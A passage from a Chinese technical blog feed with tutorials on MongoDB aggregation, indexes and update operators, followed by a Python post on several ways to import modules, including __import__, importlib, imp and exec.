class="line">db.class0.aggregate(&#123;$skip:2&#125;)</span><br></pre></td></tr></table></figure></li><li><p><strong>$limit</strong> 限制显示几条文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class0.aggregate(&#123;$limit:2&#125;)</span><br></pre></td></tr></table></figure></li><li><p><strong>$sort</strong> 排序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class0.aggregate(&#123;$sort:&#123;name:1&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="聚合管道"><a href="#聚合管道" class="headerlink" title="聚合管道"></a><strong>聚合管道</strong></h4><ul><li>将前一个聚合操作的结果给下一个聚合操作继续执行<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.collectionName.aggregate([聚合1,聚合2,...])</span><br><span class="line">db.class0.aggregate([&#123;$match:&#123;name:&#123;$gt:&#39;Tom&#39;&#125;&#125;&#125;,&#123;$project:&#123;_id:0,name:1,age:1&#125;&#125;,&#123;$sort:&#123;name:-1&#125;&#125;])</span><br><span class="line">db.class0.aggregate([&#123;$group:&#123;_id:&#39;$gender&#39;,num:&#123;$sum:1&#125;&#125;&#125;,&#123;$match:&#123;$nor:[&#123;_id:&#39;m&#39;&#125;,&#123;_id:&#39;w&#39;&#125;]&#125;&#125;])</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> DBMS </category>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mongodb </tag>
            
            <tag> 聚合 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB索引</title>
      <link href="/2018/03/16/MongoDB/MongoDB%E7%B4%A2%E5%BC%95/"/>
      <url>/2018/03/16/MongoDB/MongoDB%E7%B4%A2%E5%BC%95/</url>
      
        <content type="html"><![CDATA[<h4 id="索引"><a href="#索引" class="headerlink" title="索引"></a><strong>索引</strong></h4><ul><li>索引指的是建立指定键值及所在文档中存储位置的对照清单,使用索引以方便我们进行快速查找,减少遍历次数,提高查找效率</li></ul><p><strong>mongo中如何创建索引</strong></p><ul><li><code>ensureIndex()</code></li><li>功能: 创建索引</li><li>参数: 索引类别,索引选项  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.</span><br><span class="line">db.class0.ensureIndex(&#123;&#39;name&#39;:1&#125;)</span><br></pre></td></tr></table></figure></li><li>1表示为该域创建正向索引,-1表示逆向索引</li><li><code>_id</code> 域会自动创建索引</li></ul><p><strong>查看一个集合中的索引</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class0.getIndexes()</span><br></pre></td></tr></table></figure><p><strong>删除索引</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dropIndex()</span><br></pre></td></tr></table></figure><ul><li>功能: 删除索引</li><li>参数: 删除索引的名称  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e.g.可以通过索引名称或者索引键值对删除</span><br><span class="line">db.class0.dropIndex(&#39;name-1&#39;)</span><br><span class="line">db.class0.dropIndex(&#123;name:1&#125;)</span><br></pre></td></tr></table></figure></li><li>删除所有索引  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class0.dropIndexes()</span><br></pre></td></tr></table></figure></li></ul><h4 id="索引类型"><a href="#索引类型" class="headerlink" title="索引类型"></a><strong>索引类型</strong></h4><ul><li><p><strong>复合索引</strong></p><ul><li>根据多个域创建一个索引<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class0.ensureIndex(&#123;name:1,age:-1&#125;)</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>数组索引</strong></p><ul><li>如果对某个数组域创建索引,那么表示对数组中的每个值均创建了索引,通过数组中单个值查询,也是索引查询<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class1.ensureIndex(&#39;score&#39;:1)</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>子文档索引</strong></p><ul><li>如果对一个域创建索引,值是一个文档则子文档也会同时形成索引</li><li>如果对子文档某一个域进行索引创建,则通过子文档中的该域查找时为索引查找<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.class2.ensureIndex(&#123;&#39;publication&#39;:1&#125;)</span><br><span class="line">db.class2.ensureIndex(&#123;&#39;publication.pulisher&#39;:1&#125;)</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>覆盖索引</strong></p><ul><li>查找时只获取索引项的内容,而不必去获取原数据中的其它内容,这样就不去连接原来的数据直接返回即可<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.name为索引项,显示也只要name域</span><br><span class="line">db.class0.find(&#123;name:&#39;Lily&#39;&#125;,&#123;_id:0,name:1&#125;)</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>唯一索引</strong></p><ul><li>创建索引时希望索引域的值均不相同,也可以据此限制一个域的值<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.</span><br><span class="line">db.class0.ensureIndex(&#123;age:1&#125;,&#123;&#39;unique&#39;:true&#125;)</span><br></pre></td></tr></table></figure></li><li>当对某个域创建了唯一索引后,即不允许再插入相同值的文档</li></ul></li><li><p><strong>稀疏索引</strong> (间隙索引)</p><ul><li>只针对有指定域的文档创建索引表,没有该域的文档,不会插入到索引表中<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class2.ensureIndex(&#123;&#39;date&#39;:1&#125;,&#123;sparse:true&#125;)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="索引约束"><a href="#索引约束" class="headerlink" title="索引约束"></a><strong>索引约束</strong></h4><ul><li>影响数据的插入,删除,修改操作,当数据发生改变时,索引表必须同步更新</li><li>索引也是需要占用一定的空间资源</li><li>当数据库大量操作是插入,修改,删除操作,而非查询操作时,不适合创建索引,数据量比较小时,考虑到空间成本也不适合创建索引,即使适合创建索引的情况,也不是索引越多越好</li></ul>]]></content>
      
      
      <categories>
          
          <category> DBMS </category>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mongodb </tag>
            
            <tag> 索引 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB修改数据</title>
      <link href="/2018/03/15/MongoDB/MongoDB%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE/"/>
      <url>/2018/03/15/MongoDB/MongoDB%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h4 id="MySQL和MongoDB修改数据语句对比"><a href="#MySQL和MongoDB修改数据语句对比" class="headerlink" title="MySQL和MongoDB修改数据语句对比"></a><strong>MySQL和MongoDB修改数据语句对比</strong></h4><ul><li>MySQL:  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update tableName set ... where ...</span><br></pre></td></tr></table></figure></li><li>MongoDB:  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.collectionName.update(query,update,upsert,multi)</span><br></pre></td></tr></table></figure></li><li>功能: 修改一个文档    </li><li>参数: <ul><li><code>query</code> : 筛选要修改的文档,相当于where子句,用法同查找</li><li><code>update</code>: 将数据更新为别的内容,相当于set操作,需要使用修改器操作符</li><li><code>upsert</code>: bool值,默认为false,表示如果query的文档不存在则无法修改,如果设置为true,表示如果query的文档不存在则根据query和update参数插入新的文档</li><li><code>multi</code> : bool值,默认为false,如果有多条符合筛选条件的文档则只修改第一条,如果设置为true,则修改所有符合条件的文档<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">e.g.将Lily年龄改为24</span><br><span class="line">db.class0.update(&#123;name:&#39;Lily&#39;&#125;,&#123;$set:&#123;age:24&#125;&#125;)</span><br><span class="line"></span><br><span class="line">e.g.如果被修改的数据不存在,则插入一条新的数据</span><br><span class="line">db.class0.update(&#123;name:&#39;Jerry&#39;&#125;,&#123;$set:&#123;age:18,sex:&#39;m&#39;&#125;&#125;,true)</span><br><span class="line"></span><br><span class="line">e.g.筛选年龄大于20的,修改为18,默认修改第一条</span><br><span class="line">db.class0.update(&#123;age:&#123;$gt:20&#125;&#125;,&#123;$set:&#123;age:18&#125;&#125;)</span><br><span class="line"></span><br><span class="line">e.g.筛选性别为女,修改年龄全部为20,第4个multi参数设置为true可同时修改多条</span><br><span class="line">db.class0.update(&#123;sex:&#39;w&#39;&#125;,&#123;$set:&#123;age:20&#125;&#125;,false,true)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="修改器操作符"><a href="#修改器操作符" class="headerlink" title="修改器操作符"></a><strong>修改器操作符</strong></h4><p><strong>$set</strong></p><ul><li>修改一个域的值</li><li>增加一个域  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.增加sex域</span><br><span class="line">db.class0.update(&#123;name:&#39;Tom&#39;&#125;,&#123;$set:&#123;sex:&#39;m&#39;&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$unset</strong></p><ul><li>删除一个域  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.删除文档的sex和age域(后面的数字习惯写1或0都表示删除)</span><br><span class="line">db.class0.update(&#123;name:&#39;Tom&#39;&#125;,&#123;$unset:&#123;sex:0,age:0&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$rename</strong></p><ul><li>修改域名称  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.修改所有sex域为gender域</span><br><span class="line">db.class0.update(&#123;&#125;,&#123;$rename:&#123;sex:&#39;gender&#39;&#125;&#125;,false,true)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$setOnInsert</strong></p><ul><li>如果update操作插入新的文档,则补充插入内容</li><li>配合$set使用,修改器可以同时使用多个  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.如果插入数据则同时插入sex和tel域内容</span><br><span class="line">db.class0.update(&#123;name:&#39;amy&#39;&#125;,&#123;$set:&#123;age:21&#125;,$setOnInsert:&#123;sex:&#39;w&#39;,tel:&#39;123456&#39;&#125;&#125;,true)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$inc</strong></p><ul><li>数字加减修改器</li><li>正数,负数,小数都可以  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e.g.查询所有年龄小于18的,加1</span><br><span class="line">db.class0.update(&#123;age:&#123;$lt:18&#125;&#125;,&#123;$inc:&#123;age:1&#125;&#125;,false,true)</span><br><span class="line">e.g.查询所有年龄小于18的,减2</span><br><span class="line">db.class0.update(&#123;age:&#123;$lt:18&#125;&#125;,&#123;$inc:&#123;age:-2&#125;&#125;,false,true)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$mul</strong></p><ul><li>乘法修改器</li><li>正数,负数,小数都可以  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.查询所有年龄小于18的,乘以2</span><br><span class="line">db.class0.update(&#123;age:&#123;$lt:18&#125;&#125;,&#123;$mul:&#123;age:2&#125;&#125;,false,true)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$min</strong></p><ul><li>设定最小值: 如果筛选的文档指定的域值小于min值则不变,如果大于min值则改为min值  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class0.update(&#123;&#125;,&#123;$min:&#123;age:18&#125;&#125;,false,true)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$max</strong></p><ul><li>设定最大值: 如果筛选的文档指定域值大于max值则不变,如果小于max值则修改为max值  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class0.update(&#123;&#125;,&#123;$max:&#123;age:20&#125;&#125;,false,true)</span><br></pre></td></tr></table></figure></li></ul><h5 id="数组修改器"><a href="#数组修改器" class="headerlink" title="数组修改器"></a><strong>数组修改器</strong></h5><p><strong>$push</strong></p><ul><li>向数组中添加一项  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class1.update(&#123;name:&quot;Abby&quot;&#125;,&#123;$push:&#123;score:30&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$pushAll</strong></p><ul><li>向数组中添加多项  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class1.update(&#123;name:&quot;Abby&quot;&#125;,&#123;$pushAll:&#123;score:[11,20]&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$each</strong></p><ul><li>逐个操作  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.利用each添加多项</span><br><span class="line">db.class1.update(&#123;name:&quot;Abby&quot;&#125;,&#123;$push:&#123;score:&#123;$each:[10,5]&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$position</strong></p><ul><li><p>选择数据位置进行操作,必须和each合用</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.从位置1开始添加each两项</span><br><span class="line">db.class1.update(&#123;name:&quot;Lucy&quot;&#125;,&#123;$push:&#123;score:&#123;$each:[10,10],$position:1&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$sort</strong></p><ul><li>对数组进行排序,必须和each合用  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.1表示升序,-1降序,each必须有,为空则不添加</span><br><span class="line">db.class1.update(&#123;name:&quot;Lucy&quot;&#125;,&#123;$push:&#123;score:&#123;$each:[],$sort:1&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$pull</strong></p><ul><li><p>从数组中删除一个元素</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.从Lucy的score数组中删除10</span><br><span class="line">db.class1.update(&#123;name:&#39;Lucy&#39;&#125;,&#123;$pull:&#123;score:10&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$pullAll</strong></p><ul><li>从数组中删除多个元素  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class1.update(&#123;name:&#39;Abby&#39;&#125;,&#123;$pullAll:&#123;score:[10,20]&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$pop</strong></p><ul><li>弹出数组中的一项</li><li>1表示弹出最后一项,-1表示田川数组中的第一项,多用于弹栈  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.弹出score数组中的最后一项</span><br><span class="line">db.class1.update(&#123;name:&#39;Abby&#39;&#125;,&#123;$pop:&#123;score:1&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>addToSet</strong></p><ul><li>向数组中插入一个元素,但是该元素不能和其他元素重复  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.如果已经存在66则无法插入,如果不存在则插入66</span><br><span class="line">db.class1.update(&#123;name:&#39;Lily&#39;&#125;,&#123;$addToSet:&#123;score:66&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="数据类型补充"><a href="#数据类型补充" class="headerlink" title="数据类型补充"></a><strong>数据类型补充</strong></h4><ul><li><p><strong>时间类型</strong>:</p><ul><li>mongo中存储时间的格式: ISODate</li></ul></li><li><p>方法1: 自动生成当前时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class2.insert(&#123;title:&#39;python&#39;,date:new Date()&#125;)</span><br></pre></td></tr></table></figure></li><li><p>方法2: 生成当前时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class2.insert(&#123;title:&#39;python AI&#39;,date:ISODate()&#125;)</span><br></pre></td></tr></table></figure></li><li><p>方法3: 将生成时间变为字符串存储</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class2.insert(&#123;title:&#39;python spyder&#39;,date:Date()&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>指定时间的转换</strong>    </p><ul><li>ISODate()</li><li>功能: 生成mongo时间类型</li><li>参数: 如果不加参数则生成当前时间<ul><li>参数格式</li><li>“2018-11-11 11:11:11”</li><li>“20180101 11:11:11”</li><li>“20181102”<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class2.insert(&#123;title:&#39;python web&#39;,date:ISODate(20181111 11:11:11)&#125;)</span><br></pre></td></tr></table></figure></li></ul></li></ul><p><strong>时间戳</strong><br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class2.insert(&#123;title:&#39;python web&#39;,date:ISODate().valueOf()&#125;)</span><br></pre></td></tr></table></figure></p><ul><li><p><strong>null</strong></p><ul><li>如果某个域存在却没有值可以设置为null<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class2.insert(&#123;title:&#39;python book&#39;,price:null&#125;)</span><br></pre></td></tr></table></figure></li><li>表示某个域不存在可以通过null进行匹配<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.可以查找到date不存在的文档</span><br><span class="line">db.class2.find(&#123;date:null&#125;,&#123;_id:0&#125;)</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>Object类型</strong> </p><ul><li>域的值是一个文档</li><li>当使用外层文档引用内部文档的时候可以用 . 的方法引用,在使用时需要加上引号<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e.g.查找内部文档</span><br><span class="line">db.class2.find(&#123;&#39;publication.publisher&#39;:&#39;python study&#39;&#125;,&#123;_id:0&#125;)</span><br><span class="line"></span><br><span class="line">e.g.修改内部文档</span><br><span class="line">db.class2.find(&#123;title:&#39;python data&#39;&#125;,&#123;$set:&#123;&#39;publication.price&#39;:66.6&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="数组的下标引用"><a href="#数组的下标引用" class="headerlink" title="数组的下标引用"></a><strong>数组的下标引用</strong></h4><ul><li>使用一个数组时,可以使用 <strong>.序列下标</strong> 的方式使用数组具体的某一项,同样需要引号  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.class1.update(&#123;name:&#39;Lily&#39;&#125;,&#123;$set:&#123;&#39;score.0&#39;:60&#125;&#125;)</span><br><span class="line">db.class1.find(&#123;&#39;score.0&#39;:&#123;$gt:90&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="文档查找结果的有序性"><a href="#文档查找结果的有序性" class="headerlink" title="文档查找结果的有序性"></a><strong>文档查找结果的有序性</strong></h4><ul><li>可以通过 <code>[]</code> 取查找结果序列的某一项  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.class1.find(&#123;&#125;,&#123;_id:0&#125;)[0]</span><br><span class="line">db.class1.find(&#123;&#125;,&#123;_id:0&#125;)[3]</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> DBMS </category>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mongodb </tag>
            
            <tag> 数组 </tag>
            
            <tag> 序列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python花式导包的几种方法</title>
      <link href="/2018/03/15/Python/Python%E8%8A%B1%E5%BC%8F%E5%AF%BC%E5%8C%85%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
      <url>/2018/03/15/Python/Python%E8%8A%B1%E5%BC%8F%E5%AF%BC%E5%8C%85%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>今天跟大家分享 8 种导入模块的方法。</p><p>直接 import<br>人尽皆知的方法，直接导入即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>与此类似的还有，不再细讲</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ...</span><br><span class="line"><span class="keyword">import</span> ... <span class="keyword">as</span> ...</span><br><span class="line"><span class="keyword">from</span> ... <span class="keyword">import</span> ...</span><br><span class="line"><span class="keyword">from</span> ... <span class="keyword">import</span> ... <span class="keyword">as</span> ...</span><br></pre></td></tr></table></figure><p>一般情况下，使用 import 语句导入模块已经够用的。</p><p>但是在一些特殊场景中，可能还需要其他的导入方式。</p><p>下面我会一一地给你介绍。</p><p>使用 <strong>import</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__import__ 函数可用于导入模块，<span class="keyword">import</span> 语句也会调用函数。其定义为：</span><br><span class="line"></span><br><span class="line">__import__(name[, globals[, locals[, fromlist[, level]]]])</span><br></pre></td></tr></table></figure><p>参数介绍：</p><p>name (required): 被加载 module 的名称</p><p>globals (optional): 包含全局变量的字典，该选项很少使用，采用默认值 global()</p><p>locals (optional): 包含局部变量的字典，内部标准实现未用到该变量，采用默认值 - local()</p><p>fromlist (Optional): 被导入的 submodule 名称</p><p>level (Optional): 导入路径选项，Python 2 中默认为 -1，表示同时支持 absolute import 和 relative import。Python 3 中默认为 0，表示仅支持 absolute import。如果大于 0，则表示相对导入的父目录的级数，即 1 类似于 ‘.’，2 类似于 ‘..’。</p><p>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os = __import__(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>如果要实现 import xx as yy 的效果，只要修改左值即可</p><p>如下示例，等价于 import os as myos：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = __import__(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 importlib<br>importlib 是 Python 中的一个标准库，importlib 能提供的功能非常全面。</p><p>它的简单示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos=importlib.import_module(<span class="string">"os"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>如果要实现 import xx as yy效果，可以这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = importlib.import_module(<span class="string">"os"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 imp<br>imp 模块提供了一些 import 语句内部实现的接口。例如模块查找（find_module）、模块加载（load_module）等等（模块的导入过程会包含模块查找、加载、缓存等步骤）。可以用该模块来简单实现内建的 <strong>import</strong> 函数功能：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> imp</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>file, pathname, desc = imp.find_module(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = imp.load_module(<span class="string">'sep'</span>, file, pathname, desc)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos</span><br><span class="line">&lt;module <span class="string">'sep'</span> <span class="keyword">from</span> <span class="string">'/usr/lib64/python2.7/os.pyc'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>从 python 3 开始，内建的 reload 函数被移到了 imp 模块中。而从 Python 3.4 开始，imp 模块被否决，不再建议使用，其包含的功能被移到了 importlib 模块下。即从 Python 3.4 开始，importlib 模块是之前 imp 模块和 importlib 模块的合集。</p><p>使用 execfile<br>在 Python 2 中有一个 execfile 函数，利用它可以用来执行一个文件。</p><p>语法如下：</p><p>execfile(filename[, globals[, locals]])</p><p>参数有这么几个：</p><p>filename：文件名。</p><p>globals：变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。</p><p>locals：变量作用域，局部命名空间，如果被提供，可以是任何映射对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>execfile(<span class="string">"/usr/lib64/python2.7/os.py"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 exec<br>execfile 只能在 Python2 中使用，Python 3.x 里已经删除了这个函数。</p><p>但是原理值得借鉴，你可以使用 open … read  读取文件内容，然后再用 exec 去执行模块。</p><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">with</span> open(<span class="string">"/usr/lib64/python2.7/os.py"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="meta">... </span>    exec(f.read())</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span 